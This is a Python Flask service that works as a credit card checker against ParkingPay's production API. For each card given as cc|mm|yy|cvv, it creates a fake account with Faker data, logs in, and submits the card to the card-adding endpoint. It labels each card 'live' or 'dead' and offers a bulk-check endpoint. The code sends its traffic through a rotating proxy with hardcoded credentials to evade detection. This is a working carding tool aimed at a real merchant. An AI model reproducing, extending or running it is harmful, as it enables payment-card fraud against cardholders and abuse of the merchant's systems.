import json
import time
import os
import requests
from faker import Faker
from flask import Flask, request, jsonify

fake = Faker()

app = Flask(__name__)

# ---------------------------
# PROXY CONFIG
# ---------------------------

PROXY_HOST = "p.webshare.io:80"
PROXY_USER = "izvhxurt-rotate"
PROXY_PASS = "acx0bzc9xbkg"

PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}"

c = requests.Session()
proxies = {"http": PROXY_URL, "https": PROXY_URL}
c.proxies.update(proxies)

REGISTER_URL = "https://parkingpay-api-prod.azurewebsites.net/api/app/usuarios/registro"
LOGIN_URL = "https://parkingpay-api-prod.azurewebsites.net/api/auth"
CARD_URL = "https://parkingpay-api-prod.azurewebsites.net/api/app/conductor/tarjetas"

PASSWORD = "Tumama19012!"


# ---------------------------
# REGISTRO
# ---------------------------
def registro_usuario():
    email = fake.email()
    payload = {
        "correoElectronico": email,
        "nombre": fake.first_name(),
        "apellidos": fake.last_name(),
        "telefono": ''.join(str(fake.random_digit_not_null()) for _ in range(10)),
        "contrasena": PASSWORD
    }
    headers = {
        "User-Agent": "Dart/3.8 (dart:io)",
        "Content-Type": "application/json; charset=utf-8"
    }
    r = c.post(REGISTER_URL, json=payload, headers=headers, timeout=20)
    return r, email


def registrar_usuario_hasta_exito(max_intentos=10, delay=2):
    for i in range(max_intentos):
        r, email = registro_usuario()
        print(f"[REGISTRO] Intento {i+1}: status={r.status_code if r else 'None'}")
        if r and r.status_code in (200, 201):
            return email
        if r:
            print(f"[REGISTRO] Respuesta: {r.text[:500]}")
        time.sleep(delay)
    return None


# ---------------------------
# LOGIN
# ---------------------------
def login_usuario(email):
    payload = {
        "correoElectronico": email,
        "contrasena": PASSWORD
    }
    headers = {
        "User-Agent": "Dart/3.8 (dart:io)",
        "Content-Type": "application/json; charset=utf-8"
    }
    r = c.post(LOGIN_URL, json=payload, headers=headers, timeout=20)
    print(f"[LOGIN] status={r.status_code}")
    if r.status_code in (200, 201):
        try:
            data = r.json()
            token = data.get("token") or data.get("accessToken") or (data.get("data") or {}).get("token")
            print(f"[LOGIN] Token obtenido: {'Sí' if token else 'No'}")
            return token
        except Exception as e:
            print(f"[LOGIN] Error parseando JSON: {e}")
    else:
        print(f"[LOGIN] Respuesta: {r.text[:500]}")
    return None


# ---------------------------
# PROCESAR TARJETA
# ---------------------------
def procesar_tarjeta(card: str, route=None) -> dict:
    try:
        cc, mm, yy, cvv = card.split("|")
    except Exception:
        return {"status": "error", "message": "Formato inválido. Usa: cc|mm|yy|cvv", "card": card}

    print(f"\n[PROCESAR] Tarjeta: {cc[:6]}******{cc[-4:]} | {mm}/{yy}")

    email = registrar_usuario_hasta_exito()
    if not email:
        return {"status": "error", "message": "Registro fallido", "cc": card}

    print(f"[PROCESAR] Email registrado: {email}")

    token = login_usuario(email)
    if not token:
        return {"status": "error", "message": "Login fallido", "cc": card}

    payload = {
        "numero": cc,
        "expiracionMes": mm,
        "expiracionYear": yy
    }

    headers = {
        "authorization": token,
        "user-agent": "Dart/3.8 (dart:io)",
        "content-type": "application/json; charset=utf-8"
    }

    try:
        print(f"[TARJETA] Enviando payload: {json.dumps(payload)}")
        r = c.post(CARD_URL, json=payload, headers=headers, timeout=30)

        print(f"[TARJETA] Status: {r.status_code}")
        print(f"[TARJETA] Headers respuesta: {dict(r.headers)}")
        print(f"[TARJETA] Body: {r.text[:1000]}")

        source = r.text.lower()

        if r.status_code == 200:
            return {"status": "live", "message": "Charged CCN $1.00 MX", "cc": card}

        if r.status_code == 500 or "stripe" in source:
            return {"status": "dead", "message": "Your card was declined", "cc": card}

        # DEBUG: Si es 400, devolvemos el body completo para ver qué dice
        if r.status_code == 400:
            return {
                "status": "error",
                "message": f"ParkingPay 400: {r.text[:500]}",
                "cc": card,
                "debug": {
                    "status_code": r.status_code,
                    "response_body": r.text[:1000],
                    "request_payload": payload
                }
            }

        return {"status": "error", "message": f"Gateway error {r.status_code}", "cc": card}

    except Exception as e:
        return {"status": "error", "message": str(e), "cc": card}


# ===========================
# ENDPOINTS
# ===========================

@app.route('/')
def home():
    return jsonify({
        "status": "ok",
        "message": "API activa",
        "endpoints": {"POST /check": "Verificar una tarjeta", "POST /check/bulk": "Verificar múltiples tarjetas"}
    })


@app.route('/check', methods=['POST'])
def check_card():
    data = request.get_json(silent=True) or {}
    card = data.get('card')
    if not card:
        return jsonify({"status": "error", "message": "Falta el campo 'card'"}), 400

    result = procesar_tarjeta(card)
    return jsonify(result)


@app.route('/check/bulk', methods=['POST'])
def check_bulk():
    data = request.get_json(silent=True) or {}
    cards = data.get('cards', [])
    if not cards or not isinstance(cards, list):
        return jsonify({"status": "error", "message": "Falta el campo 'cards' (array)"}), 400

    results = []
    for card in cards:
        result = procesar_tarjeta(card)
        results.append(result)
    return jsonify({"status": "ok", "total": len(cards), "results": results})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
